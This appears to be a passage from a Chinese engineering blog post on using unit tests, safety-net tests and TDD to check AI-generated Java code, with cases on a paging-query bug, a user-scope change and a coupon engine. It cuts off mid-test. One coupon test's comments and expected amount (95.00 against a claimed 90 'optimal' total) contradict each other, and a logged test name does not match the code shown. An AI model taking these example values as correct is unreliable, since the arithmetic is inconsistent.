pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>AI生成代码质量难以把控！本文分享来自美团的技术实践，三大策略破解AI编程痛点。单测快速验证逻辑正确性，安全网保护存量代码演进，TDD模式精准传递需求。告别「看起来没问题」的错觉，构建AI时代的代码质量保障体系。</p>
</blockquote>
<h2 data-id="heading-0">一、引言</h2>
<p>目前，国内外很多AI Coding助手能在几秒钟内生成完整代码块，大大提升了开发效率，但这种高速开发模式也带来了潜在风险——与人工编码不同是，AI Coding助手生成代码存在两个特殊风险：其一，AI Coding助手依赖于上下文与模型自身的能力，输出的代码质量相对不可控。其二，AI生成的代码虽然逻辑通顺、结构完整，但可能隐藏着难以察觉的边界问题或逻辑缺陷。</p>
<p><strong>核心问题：我们如何快速的验证AI生成代码的质量和可靠性？</strong></p>
<p>本文旨在分享如何借助单元测试，让AI编程合作更高效可靠，主要解决三个常见痛点：</p>
<ol>
<li><strong>肉眼审查困境</strong>：AI一次性生成大量代码时，难以快速准确判断逻辑完备性；</li>
<li><strong>存量代码信任危机</strong>：如何验证AI修改老代码时，不会产生非预期的结果；</li>
<li><strong>需求传达难题</strong>：如何精准向AI表达复杂需求并快速验证。</li>
</ol>
<p>针对上述三个常见痛点，本文提出采用不同的单元测试策略来应对以上问题。每个策略都针对一个特定痛点设计：策略一通过测试解决肉眼审查的局限性；策略二构建单测安全网应对存量代码的信任问题；策略三则采用TDD模式优化需求传达与验证流程。下文将依次展开说明，希望能对大家有所帮助或启发。</p>
<h2 data-id="heading-1">二、策略一：单测检验AI代码逻辑正确性</h2>
<h3 data-id="heading-2">2.1 问题背景</h3>
<p>传统的人工代码审查在AI生成的大量代码面前显得低效且不可靠。在软件测试实践中，有着测试左移（Shift Left Testing）的概念，本质上是借助工具和测试手段更早地发现问题和预防问题。在AI Coding时代，这一理念尤为关键：跳过单元测试直接集成测试看似"抄近路"，实则是将风险后置——开发阶段几分钟能发现的Bug，在集成测试环境可能需要较长定位修复，这中间包含了代码部署、环境准备、测试条件的准备、问题定位、开发人员修复、再次部署验证等一系列漫长的环节。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bf06fb9bdf25441089c1e673219ed865~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg576O5Zui5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765518691&amp;x-signature=PSSeuYCvFTfPj6FpnIZvRjo%2B6yo%3D" alt="" loading="lazy"/></p>
<p>相比之下，单元测试具有独特的优势：它能够独立运行、快速验证结果，并且可以无限次重复执行。这种测试方式就像是为项目进行的一次性投资，却能为整个开发周期构建起一张可靠的“安全网”。它不仅能实时验证AI Coding生成的代码是否正确，更能持续保障未来代码的质量稳定性，让开发团队始终对代码库保持信心。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d8e14e0feeea4de78ad048f9236831e0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg576O5Zui5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765518691&amp;x-signature=7sCwXzVNWX1KJLXAWrSQpsEx3f0%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-3">2.2 案例：分页查询接口的隐蔽Bug</h3>
<p><strong>任务背景</strong>：实现一个支持多条件筛选的复杂分页查询接口pageQueryRobot</p>
<p>AI生成了如下核心查询逻辑：</p>
<pre><code class="hljs language-scss" lang="scss">public List&lt;AgentRobotE&gt; <span class="hljs-built_in">pageQueryRobotsByCondition</span>(List&lt;Long&gt; shopIds, String chatSceneCode,
        Boolean enabled, Integer pageNo, Integer pageSize) {
    <span class="hljs-comment">// ... 前置校验代码 ...</span>

    <span class="hljs-comment">// 分页查询机器人基础信息</span>
    int offset = (pageNo - <span class="hljs-number">1</span>) * pageSize;
    List&lt;AgentRobotEntity&gt; entities = robotIds<span class="hljs-selector-class">.stream</span>()
            <span class="hljs-selector-class">.skip</span>(offset)
            <span class="hljs-selector-class">.limit</span>(pageSize)
            <span class="hljs-selector-class">.map</span>(robotId -&gt; agentRobotDAO.getRobotById(robotId, false))
            <span class="hljs-selector-class">.filter</span>(Objects::nonNull)
            <span class="hljs-comment">// 问题代码：类型不匹配的隐蔽Bug</span>
            <span class="hljs-selector-class">.filter</span>(entity -&gt; enabled == null || Objects.equals(entity.getEnabled(), enabled ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>))
            .<span class="hljs-built_in">filter</span>(entity -&gt; Objects.<span class="hljs-built_in">equals</span>(entity.<span class="hljs-built_in">getChatSceneCode</span>(), chatSceneCode))
            .<span class="hljs-built_in">collect</span>(Collectors.<span class="hljs-built_in">toList</span>());

    return entities<span class="hljs-selector-class">.stream</span>()
            <span class="hljs-selector-class">.map</span>(this::convertToModel)
            <span class="hljs-selector-class">.filter</span>(Objects::nonNull)
            <span class="hljs-selector-class">.collect</span>(Collectors.toList());
}
</code></pre>
<p>问题分析：这段代码看起来逻辑完整，但第8行的过滤逻辑包含了多个复杂元素：</p>
<ul>
<li>三元运算符 enabled ? 1 : 0</li>
<li>Objects.equals 的使用</li>
<li>Boolean到Integer的隐式逻辑转换</li>
</ul>
<p>仅凭肉眼很难发现其中的类型不匹配问题。</p>
<p><strong>单元测试发现问题</strong>：通过AI编写了17个全面的单元测试用例，覆盖：</p>
<ul>
<li>正常场景：各种有效参数组合</li>
<li>边界场景：null值、空集合处理</li>
<li>参数组合：enabled为true/false/null的不同情况</li>
</ul>

<pre><code class="hljs language-scss" lang="scss"><span class="hljs-keyword">@Test</span>
public void testPageQueryWhenEnabledIsTrue() {
    <span class="hljs-comment">// arrange</span>
    List&lt;Long&gt; shopIds = Arrays<span class="hljs-selector-class">.asList</span>(<span class="hljs-number">12345</span>L, <span class="hljs-number">67890</span>L);
    String chatSceneCode = "SCENE_C";
    Boolean enabled = true;  <span class="hljs-comment">// 测试enabled为true的情况</span>

    <span class="hljs-comment">// 模拟数据库返回的实体，enabled字段为Boolean类型</span>
    AgentRobotEntity mockEntity = new <span class="hljs-built_in">AgentRobotEntity</span>();
    mockEntity<span class="hljs-selector-class">.setEnabled</span>(true);  <span class="hljs-comment">// 注意：这里是Boolean类型</span>
    mockEntity<span class="hljs-selector-class">.setChatSceneCode</span>("SCENE_C");

    <span class="hljs-built_in">when</span>(agentRobotDAO.getRobotById(anyLong(), <span class="hljs-built_in">eq</span>(false)))<span class="hljs-selector-class">.thenReturn</span>(mockEntity);

    <span class="hljs-comment">// act</span>
    List&lt;AgentRobotE&gt; result = repository<span class="hljs-selector-class">.pageQueryRobotsByCondition</span>(
        shopIds, chatSceneCode, enabled, <span class="hljs-number">1</span>, <span class="hljs-number">10</span>);

    <span class="hljs-comment">// assert - 这个测试失败了！</span>
    <span class="hljs-built_in">assertEquals</span>(<span class="hljs-number">1</span>, result.size());  <span class="hljs-comment">// 期望返回1个结果，实际返回0个</span>
}
</code></pre>
<p><strong>测试运行结果</strong>：当enabled为true时测试失败！</p>
<p><strong>问题定位</strong>：通过测试失败，快速定位到过滤逻辑的问题：</p>
<pre><code class="hljs language-vbnet" lang="vbnet">// 错误的逻辑：entity.getEnabled()返回<span class="hljs-type">Boolean</span>类型，但与<span class="hljs-type">Integer</span>比较
Objects.<span class="hljs-keyword">equals</span>(entity.getEnabled(), enabled ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>)
// 当enabled=<span class="hljs-literal">true</span>时，比较的是 Objects.<span class="hljs-keyword">equals</span>(<span class="hljs-type">Boolean</span>.<span class="hljs-literal">TRUE</span>, <span class="hljs-number">1</span>) -&gt; <span class="hljs-literal">false</span>
// 当enabled=<span class="hljs-literal">false</span>时，比较的是 Objects.<span class="hljs-keyword">equals</span>(<span class="hljs-type">Boolean</span>.<span class="hljs-literal">TRUE</span>, <span class="hljs-number">0</span>) -&gt; <span class="hljs-literal">false</span>
</code></pre>
<p>正确修复：</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// 修复后：直接比较Boolean类型</span>
.filter(entity -&gt; enabled == <span class="hljs-literal">null</span> || Objects.<span class="hljs-keyword">equals</span>(entity.getEnabled(), enabled))
</code></pre>
<p><strong>意外收获</strong>：在审查测试覆盖的代码时，还发现了N+1查询的性能问题：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// 存在性能问题的代码</span>
.<span class="hljs-built_in">map</span>(robotId -&gt; agentRobotDAO.getRobotById(robotId, <span class="hljs-literal">false</span>))  <span class="hljs-comment">// 每个robotId单独查询</span>
</code></pre>
<p><strong>成果验证</strong>：修复后，所有17个单元测试用例全部通过，代码质量得到保障。</p>
<h2 data-id="heading-4">三、策略二：构建安全网保护存量代码</h2>
<h3 data-id="heading-5">3.1 问题场景</h3>
<p>AI对存量代码的修改挑战更大。AI看到的可能只是函数或类的局部，无法理解背后的业务规则和历史包袱。如何放心的让AI修改已有的代码？</p>
<p><strong>在进行AI Coding前，需要确保旧有逻辑，处于单元测试的完全覆盖保护中</strong>，这就像在开启汽车的“自动辅助驾驶”功能前，必须先系好安全带一样。这条“安全带”就是我们完善的、可运行的单元测试集。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/be3f772c9bb64bfaa97fa109f593fc95~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg576O5Zui5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765518691&amp;x-signature=UXRloKXsww7tNUTUEnXBpFiQmdM%3D" alt="" loading="lazy"/></p>
<ul>
<li><strong>快速验证，精准反馈</strong>：AI生成修改后的代码无需人工逐行对比，只需运行单元测试即可获得即时反馈。测试失败的用例直接揭示AI修改中存在的问题——要么触及了不应改动的逻辑，要么未能正确实现预期变更。这种反馈机制既高效又客观。</li>
<li><strong>清晰界定修改边界</strong>：单元测试结果帮助我们明确判断——AI的修改是否精准实现了目标？在引入新功能的同时是否完整保留了原有逻辑？通过区分预期内的失败（主动修改旧逻辑）和意外失败（破坏现有功能），我们获得了优化AI方案的明确方向，大幅提升了迭代效率。</li>
</ul>
<h3 data-id="heading-6">3.2 案例：延迟回复策略的用户范围扩展</h3>
<p><strong>业务背景</strong>：需要将消息延迟回复服务从原来的平台A、平台B的用户扩展到平台C用户。</p>
<p><strong>原始代码分析：</strong></p>
<pre><code class="hljs language-ini" lang="ini">// TextDelayReplyStrategy.java 中的核心逻辑
private boolean needSkip(ChatHistoryE chatHistoryE) {
    UserDTO <span class="hljs-attr">UserDTO</span> = UserHelper.parseUser(chatHistoryE.getUserId())<span class="hljs-comment">;</span>
    return MessageSendDirectionEnum.CLIENT_SEND.value != chatHistoryE.getMessageStatus()
               || <span class="hljs-attr">MessageShieldEnum.RECEIVER_SHIELD.value</span> == chatHistoryE.getShield()
               || <span class="hljs-attr">UserDTO</span> == null
               || !UserType.isLoginUser(UserDTO.getUserType())<span class="hljs-comment">;  // 关键判断逻辑</span>
}
</code></pre>
<p>这个needSkip方法决定了哪些用户类型需要跳过延迟回复处理。原逻辑中，UserType.isLoginUser()只覆盖平台A、平台B的登录用户，不包括平台C用户。</p>
<p><strong>修改前的安全网构建：</strong></p>
<p>按照“分析-测试-实施-验证”方法论，首先完善单元测试：</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// 针对现有逻辑的保护性测试</span>
<span class="hljs-keyword">@Test</span>
public void testNeedSkipWithAUser() {
    <span class="hljs-comment">// 平台A用户不应被跳过</span>
    ChatHistoryE chatHistory = <span class="hljs-built_in">buildChatHistory</span>(A_USER_ID);
    <span class="hljs-built_in">assertFalse</span>(strategy.needSkip(chatHistory));
}

<span class="hljs-keyword">@Test</span>
public void testNeedSkipWithBUser() {
    <span class="hljs-comment">// 平台B用户不应被跳过</span>
    ChatHistoryE chatHistory = <span class="hljs-built_in">buildChatHistory</span>(B_USER_ID);
    <span class="hljs-built_in">assertFalse</span>(strategy.needSkip(chatHistory));
}

<span class="hljs-keyword">@Test</span>
public void testNeedSkipWithCUser() {
    <span class="hljs-comment">// 平台C在修改前应被跳过</span>
    ChatHistoryE chatHistory = <span class="hljs-built_in">buildChatHistory</span>(C_USER_ID);
    <span class="hljs-built_in">assertTrue</span>(strategy.needSkip(chatHistory));  <span class="hljs-comment">// 修改前的预期行为</span>
}

<span class="hljs-keyword">@Test</span>
public void testNeedSkipWithGuestUser() {
    <span class="hljs-comment">// 游客用户应被跳过</span>
    ChatHistoryE chatHistory = <span class="hljs-built_in">buildChatHistory</span>(GUEST_USER_ID);
    <span class="hljs-built_in">assertTrue</span>(strategy.needSkip(chatHistory));
}
</code></pre>
<p>运行基线测试：确保所有测试通过，建立基线状态</p>
<pre><code class="hljs language-yaml" lang="yaml">[<span class="hljs-string">INFO</span>] <span class="hljs-attr">Tests run:</span> <span class="hljs-number">15</span><span class="hljs-string">,</span> <span class="hljs-attr">Failures:</span> <span class="hljs-number">0</span><span class="hljs-string">,</span> <span class="hljs-attr">Errors:</span> <span class="hljs-number">0</span><span class="hljs-string">,</span> <span class="hljs-attr">Skipped:</span> <span class="hljs-number">0</span>
[<span class="hljs-string">INFO</span>] <span class="hljs-string">所有现有逻辑测试通过，可以安全修改</span>
</code></pre>
<p>AI辅助修改实施：</p>
<p>向AI提供需求："将平台C用户也纳入延迟回复服务范围"</p>
<p>AI分析代码后给出修改方案：</p>
<pre><code class="hljs language-ini" lang="ini">// 修改后的代码
private boolean needSkip(ChatHistoryE chatHistoryE) {
    UserDTO <span class="hljs-attr">UserDTO</span> = UserHelper.parseUser(chatHistoryE.getUserId())<span class="hljs-comment">;</span>
    return MessageSendDirectionEnum.CLIENT_SEND.value != chatHistoryE.getMessageStatus()
               || <span class="hljs-attr">MessageShieldEnum.RECEIVER_SHIELD.value</span> == chatHistoryE.getShield()
               || <span class="hljs-attr">UserDTO</span> == null
               || !UserType.isAorBorCLoginUser(UserDTO.getUserType())<span class="hljs-comment">;  // 扩展用户范围</span>
}
</code></pre>
<p>验证阶段的精准反馈：</p>
<p>修改后运行测试集：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># 运行结果</span>
[<span class="hljs-string">INFO</span>] <span class="hljs-attr">Tests run:</span> <span class="hljs-number">15</span><span class="hljs-string">,</span> <span class="hljs-attr">Failures:</span> <span class="hljs-number">1</span><span class="hljs-string">,</span> <span class="hljs-attr">Errors:</span> <span class="hljs-number">0</span><span class="hljs-string">,</span> <span class="hljs-attr">Skipped:</span> <span class="hljs-number">0</span>
[<span class="hljs-string">ERROR</span>] <span class="hljs-attr">testNeedSkipWithCProviderUser:</span> <span class="hljs-string">expected:&lt;true&gt;</span> <span class="hljs-string">but</span> <span class="hljs-string">was:&lt;false&gt;</span>
</code></pre>
<p>结果分析：</p>
<p>✅ testNeedSkipWithAUser - 通过（平台A用户逻辑未变）
✅ testNeedSkipWithBUser - 通过（平台B用户逻辑未变）
❌ testNeedSkipWithCUser - 失败（平台C预期的变更）
✅ testNeedSkipWithGuestUser - 通过（游客用户逻辑未变）</p>
<p>更新期望值：</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-keyword">@Test</span>
public void testNeedSkipWithCUser() {
    <span class="hljs-comment">// 修改后：平台C不应被跳过</span>
    ChatHistoryE chatHistory = <span class="hljs-built_in">buildChatHistory</span>(C_USER_ID);
    <span class="hljs-built_in">assertFalse</span>(strategy.needSkip(chatHistory));  <span class="hljs-comment">// 更新期望值</span>
}
</code></pre>
<p>最终验证：</p>
<pre><code class="hljs language-yaml" lang="yaml">[<span class="hljs-string">INFO</span>] <span class="hljs-attr">Tests run:</span> <span class="hljs-number">15</span><span class="hljs-string">,</span> <span class="hljs-attr">Failures:</span> <span class="hljs-number">0</span><span class="hljs-string">,</span> <span class="hljs-attr">Errors:</span> <span class="hljs-number">0</span><span class="hljs-string">,</span> <span class="hljs-attr">Skipped:</span> <span class="hljs-number">0</span>
[<span class="hljs-string">INFO</span>] <span class="hljs-string">所有测试通过，修改安全完成</span>
</code></pre>
<p>这种方法将开发者从“担心AI改坏代码”的不信任中解放出来，明确知道哪些功能被影响，哪些保持不变，实现安全、高效的存量代码演进。</p>
<h2 data-id="heading-7">四、策略三：TDD思想驱动AI开发</h2>
<h3 data-id="heading-8">4.1 “先生成，后验证”的局限</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7096cd7855594bd0b53d79fd1d7870a1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg576O5Zui5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765518691&amp;x-signature=5LNtwMgsobxL3LgE3fa2Lp7VVmU%3D" alt="" loading="lazy"/></p>
<p>前面两节所提到的策略可以归类为"先生成，后验证"，在一定的场景下仍然存在两个问题：</p>
<ul>
<li><strong>提示词驱动</strong>：开发者反复修改自然语言描述，AI产出不确定，返工频繁；</li>
<li><strong>肉眼审查</strong>：生成测试用例仍然需要人工验证，一旦用例较多，效率依然低下。</li>
</ul>
<h3 data-id="heading-9">4.2 TDD模式的革命性转变</h3>
<p><strong>TDD 核心理念：</strong></p>
<ul>
<li><strong>测试先行</strong>：先写测试，再写实现代码。</li>
<li><strong>小步快跑</strong>：以微小增量推进开发，每次只解决一个问题。</li>
<li><strong>设计驱动</strong>：测试即需求文档，驱动接口设计和代码结构。</li>
<li><strong>安全网</strong>：测试集提供即时反馈，支持安全重构。</li>
</ul>
<p>整个开发过程严格遵循 Red -&gt; Green -&gt; Refactor 的循环。</p>
<ul>
<li>🔴 Red: 先编写一个失败的单元测试，用代码来定义我们期望实现的功能。</li>
<li>🟢 Green: 编写最精简的业务代码，让测试恰好通过。</li>
<li>🔵 Refactor: 在测试持续通过的前提下，重构优化代码的设计和质量。</li>
</ul>
<p>借助测试<strong>驱动开发（TDD）思想</strong>，我们先为AI提供一份清晰、无歧义的“需求说明书”和“验收标准”，然后指导它进行代码的生成。这个过程的核心是“🔴 红-🟢 绿-🔵 重构”循环，它将我们的每一次的对话，都转化为一次可验证的、可累加的进步。采用“先验证，后实现”的<strong>红-绿-重构</strong>循环，将模糊的需求转化为精确的代码语言。</p>
<h3 data-id="heading-10">4.3 案例：优惠券使用规则引擎的复杂逻辑</h3>
<p><strong>业务需求</strong>：开发一个智能优惠券使用规则引擎，支持"多券叠加使用和最优组合推荐"</p>
<p><strong>传统困难</strong>：</p>
<ul>
<li>自然语言描述：“实现优惠券规则引擎，支持多种券类型的叠加使用，并智能推荐最优使用方案”</li>
<li>AI需要猜测：哪些券可以叠加？什么是“最优”？有哪些使用限制？</li>
<li>反复沟通：多次修改提示词，AI理解仍然偏离业务实际</li>
</ul>
<p><strong>第一次尝试</strong>：AI理解为“简单累加所有优惠”</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// AI第一次实现 - 过于简化</span>
public BigDecimal <span class="hljs-built_in">calculateDiscount</span>(Order order, List&lt;Coupon&gt; coupons) {
    return coupons<span class="hljs-selector-class">.stream</span>()
        <span class="hljs-selector-class">.map</span>(coupon -&gt; coupon.getDiscountAmount())
        <span class="hljs-selector-class">.reduce</span>(BigDecimal.ZERO, BigDecimal::add);
}
<span class="hljs-comment">// 问题：忽略了券的使用条件、互斥规则、叠加限制</span>
</code></pre>
<p><strong>第二次尝试</strong>：AI理解为“选择面额最大的券”</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// AI第二次实现 - 逻辑错误</span>
public List&lt;Coupon&gt; <span class="hljs-built_in">selectOptimalCoupons</span>(Order order, List&lt;Coupon&gt; availableCoupons) {
    return availableCoupons<span class="hljs-selector-class">.stream</span>()
        <span class="hljs-selector-class">.filter</span>(coupon -&gt; order.getTotalAmount()<span class="hljs-selector-class">.compareTo</span>(coupon.getMinOrderAmount()) &gt;= <span class="hljs-number">0</span>)
        <span class="hljs-selector-class">.max</span>(Comparator.comparing(Coupon::getDiscountAmount))
        <span class="hljs-selector-class">.map</span>(List::of)
        <span class="hljs-selector-class">.orElse</span>(Collections.emptyList());
}
<span class="hljs-comment">// 问题：只考虑单券最大优惠，未考虑多券组合的更优效果</span>
</code></pre>
<p><strong>第三次尝试</strong>：AI尝试复杂逻辑但引入更多问题</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// AI第三次实现 - 逻辑混乱</span>
<span class="hljs-keyword">public</span> <span class="hljs-title class_">CouponUsageResult</span> <span class="hljs-title function_">applyCoupons</span>(<span class="hljs-params">Order order, List&lt;Coupon&gt; coupons</span>) {
    <span class="hljs-comment">// 各种复杂的if-else嵌套，但缺乏清晰的业务规则</span>
    <span class="hljs-comment">// 没有处理券的互斥关系</span>
    <span class="hljs-comment">// 没有考虑计算顺序对最终优惠的影响</span>
    <span class="hljs-comment">// 边界条件处理不当</span>
}
</code></pre>
<p>经过多轮提示词优化，每次都需要重新解释复杂的业务规则，仍不满足预期。</p>
<p>TDD方式的完整循环：</p>
<p>🔴 红色阶段：用测试定义需求</p>
<p>编写测试用例，精确定义复杂的业务规则：</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@Test</span>
public void <span class="hljs-built_in">testCouponUsageWithBasicStackingRules</span>() {
    <span class="hljs-comment">// 构造订单：总价100元，包含数码产品</span>
    <span class="hljs-selector-tag">Order</span> <span class="hljs-selector-tag">order</span> = <span class="hljs-selector-tag">new</span> <span class="hljs-selector-tag">Order</span>()
        <span class="hljs-selector-class">.setTotalAmount</span>(new <span class="hljs-built_in">BigDecimal</span>(<span class="hljs-string">"100.00"</span>))
        <span class="hljs-selector-class">.addItem</span>(<span class="hljs-string">"数码产品"</span>, new <span class="hljs-built_in">BigDecimal</span>(<span class="hljs-string">"100.00"</span>));
    
    <span class="hljs-comment">// 构造可用优惠券</span>
    <span class="hljs-selector-tag">List</span>&lt;<span class="hljs-selector-tag">Coupon</span>&gt; <span class="hljs-selector-tag">availableCoupons</span> = <span class="hljs-selector-tag">Arrays</span><span class="hljs-selector-class">.asList</span>(
        new <span class="hljs-built_in">Coupon</span>().<span class="hljs-built_in">setType</span>(<span class="hljs-string">"满减券"</span>).<span class="hljs-built_in">setCondition</span>(<span class="hljs-string">"满50减10"</span>).<span class="hljs-built_in">setDiscountAmount</span>(new <span class="hljs-built_in">BigDecimal</span>(<span class="hljs-string">"10"</span>)),
        new <span class="hljs-built_in">Coupon</span>().<span class="hljs-built_in">setType</span>(<span class="hljs-string">"打折券"</span>).<span class="hljs-built_in">setCondition</span>(<span class="hljs-string">"数码类9折"</span>).<span class="hljs-built_in">setDiscountRate</span>(new <span class="hljs-built_in">BigDecimal</span>(<span class="hljs-string">"0.9"</span>)),
        new <span class="hljs-built_in">Coupon</span>().<span class="hljs-built_in">setType</span>(<span class="hljs-string">"免邮券"</span>).<span class="hljs-built_in">setCondition</span>(<span class="hljs-string">"免运费"</span>).<span class="hljs-built_in">setDiscountAmount</span>(new <span class="hljs-built_in">BigDecimal</span>(<span class="hljs-string">"5"</span>))
    );
    
    <span class="hljs-comment">// 期望结果：满减券和免邮券可叠加，打折券与满减券互斥，应选择最优组合</span>
    <span class="hljs-selector-tag">CouponUsageResult</span> <span class="hljs-selector-tag">result</span> = <span class="hljs-selector-tag">CouponEngine</span><span class="hljs-selector-class">.calculateOptimalUsage</span>(order, availableCoupons);
    
    <span class="hljs-comment">// 验证最优方案：使用打折券+免邮券 (90+0=90元，比满减券+免邮券的85元更优)</span>
    <span class="hljs-selector-tag">assertEquals</span>(<span class="hljs-number">2</span>, result.<span class="hljs-built_in">getUsedCoupons</span>().<span class="hljs-built_in">size</span>());
    <span class="hljs-selector-tag">assertTrue</span>(result.<span class="hljs-built_in">getUsedCoupons</span>().<span class="hljs-built_in">stream</span>().<span class="hljs-built_in">anyMatch</span>(c -&gt; <span class="hljs-string">"打折券"</span>.<span class="hljs-built_in">equals</span>(c.<span class="hljs-built_in">getType</span>())));
    <span class="hljs-selector-tag">assertTrue</span>(result.<span class="hljs-built_in">getUsedCoupons</span>().<span class="hljs-built_in">stream</span>().<span class="hljs-built_in">anyMatch</span>(c -&gt; <span class="hljs-string">"免邮券"</span>.<span class="hljs-built_in">equals</span>(c.<span class="hljs-built_in">getType</span>())));
    <span class="hljs-selector-tag">assertEquals</span>(new <span class="hljs-built_in">BigDecimal</span>(<span class="hljs-string">"95.00"</span>), result.<span class="hljs-built_in">getFinalAmount</span>()); <span class="hljs-comment">// 100*0.9 + 0 - 5运费</span>
}

@<span class="hljs-selector-tag">Test</span>  
<span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">void</span> <span class="hljs-selector-tag">testCouponMutualExclusionRules</span>() {
    <span class="hljs-selector-tag">Order</span> <span class="hljs-selector-tag">order</span> = <span class="hljs-selector-tag">new</span> <span class="hljs-selector-tag">Order</span>()<span class="hljs-selector-class">.setTotalAmount</span>(new <span class="hljs-built_in">BigDecimal</span>(<span class="hljs-string">"200.00"</span>));
    
    <span class="hljs-selector-tag">List</span>&lt;<span class="hljs-selector-tag">Coupon</span>&gt; <span class="hljs-selector-tag">availableCoupons</span> = <span class="hljs-selector-tag">Arrays</span><span class="hljs-selector-class">.asList</span>(
        new <span class="hljs-built_in">Coupon</span>().<span class="hljs-built_in">setType</span>(<span class="hljs-string">"满减券"</span>).<span class="hljs-built_in">setCondition</span>(<span class="hljs-string">"满100减30"</span>).<span class="hljs-built_in">setDiscountAmount</span>(new <span class="hljs-built_in">BigDecimal</span>(<span class="hljs-string">"30"</span>)),
        new <span class="hljs-built_in">Coupon</span>().<span class="hljs-built_in">setType</span>(<span class="hljs-string">"打折券"</span>).<span class="hljs-built_in">setCondition</span>(<span class="hljs-string">"全场8折"</span>).<span class="hljs-built_in">setDiscountRate</span>(new <span class="hljs-built_in">BigDecimal</span>(<span class="hljs-string">"0.8"</span>)),
        new <span class="hljs-built_in">Coupon</span>().<span class="hljs-built_in">setType</span>(<span class="hljs-string">"新用户专享"</span>).<span class="hljs-built_in">setCondition</span>(<span class="hljs-string">"首单5折"</span>).<span class="hljs-built_in">setDiscountRate</span>(new <span class="hljs-built_in">BigDecimal</span>(<span class="hljs-string">"0.5"</span>))
    );
    
    <span class="hljs-selector-tag">CouponUsageResult</span> <span class="hljs-selector-tag">result</span> = <span class="hljs-selector-tag">CouponEngine</span><span class="hljs-selector-class">.calculateOptimalUsage</span>(order, availableCoupons);
    
    <span class="hljs-comment">// 验证互斥规则：新用户券与其他券互斥，且优惠最大，应该单独使用</span>
    <span class="hljs-selector-tag">assertEquals</span>(<span class="hljs-number">1</span>, result.<span class="hljs-built_in">getUsedCoupons</span>().<span class="hljs-built_in">size</span>());
    <span class="hljs-selector-tag">assertEquals</span>(<span class="hljs-string">"新用户专享"</span>, result.<span class="hljs-built_in">getUsedCoupons</span>().<span class="hljs-built_in">get</span>(<span class="hljs-number">0</span>).<span class="hljs-built_in">getType</span>());
    <span class="hljs-selector-tag">assertEquals</span>(new <span class="hljs-built_in">BigDecimal</span>(<span class="hljs-string">"100.00"</span>), result.<span class="hljs-built_in">getFinalAmount</span>()); <span class="hljs-comment">// 200 * 0.5</span>
}

@<span class="hljs-selector-tag">Test</span>
<span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">void</span> <span class="hljs-selector-tag">testCouponUsageConditionValidation</span>() {
    <span class="hljs-selector-tag">Order</span> <span class="hljs-selector-tag">order</span> = <span class="hljs-selector-tag">new</span> <span class="hljs-selector-tag">Order</span>()
        <span class="hljs-selector-class">.setTotalAmount</span>(new <span class="hljs-built_in">BigDecimal</span>(<span class="hljs-string">"30.00"</span>))
        <span class="hljs-selector-class">.setUserLevel</span>(<span class="hljs-string">"普通用户"</span>)
        <span class="hljs-selector-class">.addItem</span>(<span class="hljs-string">"服装"</span>, new <span class="hljs-built_in">BigDecimal</span>(<span class="hljs-string">"30.00"</span>));
    
    <span class="hljs-selector-tag">List</span>&lt;<span class="hljs-selector-tag">Coupon</span>&gt; <span class="hljs-selector-tag">availableCoupons</span> = <span class="hljs-selector-tag">Arrays</span><span class="hljs-selector-class">.asList</span>(
        new <span class="hljs-built_in">Coupon</span>().<span class="hljs-built_in">setCondition</span>(<span class="hljs-string">"满50减10"</span>), <span class="hljs-comment">// 不满足金额条件</span>
        new <span class="hljs-built_in">Coupon</span>().<span class="hljs-built_in">setCondition</span>(<span class="hljs-string">"VIP专享9折"</span>), <span class="hljs-comment">// 不满足用户等级条件  </span>
        new <span class="hljs-built_in">Coupon</span>().<span class="hljs-built_in">setCondition</span>(<span class="hljs-string">"数码类8折"</span>), <span class="hljs-comment">// 不满足品类条件</span>
